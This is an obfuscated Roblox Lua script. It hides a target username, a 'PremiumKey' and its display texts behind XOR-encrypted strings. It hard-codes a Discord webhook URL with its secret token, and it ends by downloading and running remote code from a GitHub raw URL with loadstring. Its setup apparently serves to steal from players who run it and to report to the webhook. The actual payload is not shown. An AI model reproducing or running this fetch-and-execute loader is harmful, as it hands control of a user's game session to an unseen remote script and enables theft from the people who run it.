--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + ((i - 1) % #LUAOBFUSACTOR_KEY), 1 + ((i - 1) % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
gUserName = LUAOBFUSACTOR_DECRYPT_STR_0("\104\135\227\180\47\171\195\178\53\140\224\162\42", "\89\206\143\219");
Webhook = "https://discord.com/api/webhooks/1082054645901439076/Jn-ZME8kIop3hK1XZIW2ZMSMxOEcMFpXe6-5eN9kFbzmU7xchqesvqzUinvTMog6uUp-";
_G.PremiumKey = LUAOBFUSACTOR_DECRYPT_STR_0("\48\169\183\220\207\56\228\129\255\218\5\209\247\193\248\4", "\64\144\207\140\169");
_G.ScriptName = LUAOBFUSACTOR_DECRYPT_STR_0("\215\61\17\2\32\52\198\60\23\6\45\102", "\149\82\126\118\72\20");
_G.FirstText = LUAOBFUSACTOR_DECRYPT_STR_0("\98\200\183\15\213\201\192\165\66\139\137\9\196\217\137\130\86\139\149\10\192\220\147\137\17\233\160\70\245\220\148\133\84\197\177\72", "\49\171\197\102\165\189\224\236");
_G.SecondText = LUAOBFUSACTOR_DECRYPT_STR_0("\119\182\249\86\58\146\22\158\251\87\44\199", "\54\218\148\57\73\230");
_G.ThirdText = LUAOBFUSACTOR_DECRYPT_STR_0("\149\165\174\61\168\179\181\175\160\80\234", "\198\202\142\126\196\220");
_G.WaitingTime = 60;
loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))();
